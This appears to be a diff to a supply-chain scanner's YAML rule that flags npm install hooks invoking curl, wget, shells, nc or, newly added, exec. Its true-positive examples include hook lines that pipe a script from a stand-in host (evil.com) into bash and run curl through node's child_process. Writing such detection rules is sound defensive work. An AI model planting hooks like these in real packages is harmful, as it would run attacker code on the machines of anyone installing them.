@@ -7,15 +7,17 @@ targets: ["package.json"]
 match_mode: any
 patterns:
   - type: regex
-    value: "(?i)[\"'](preinstall|postinstall|preuninstall)[\"']\\s*:\\s*[\"'][^\"']*(curl|wget|bash|sh |powershell|node -e|python|eval|nc |ncat)[^\"']*[\"']"
+    value: "(?i)[\"'](preinstall|postinstall|preuninstall)[\"']\\s*:\\s*[\"'][^\"']*(curl|wget|bash|sh |powershell|node -e|python|eval|nc |ncat|exec )[^\"']*[\"']"
 remediation: "Pin the download URL to a specific version and verify checksums. Avoid curl-pipe-shell patterns."
 examples:
   true_positive:
     - "\"preinstall\": \"curl http://evil.com/payload.sh | bash\""
     - "\"postinstall\": \"node -e \\\"require('child_process').exec('curl evil.com')\\\"\""
+    - "\"postinstall\": \"exec ./payload\""
   false_positive:
     - "\"postinstall\": \"husky install\""
     - "\"preinstall\": \"npx only-allow pnpm\""
+    - "\"postinstall\": \"execa ./tasks.js\""
 ---
 id: SUPPLY_002
 name: "Python setup.py execution"
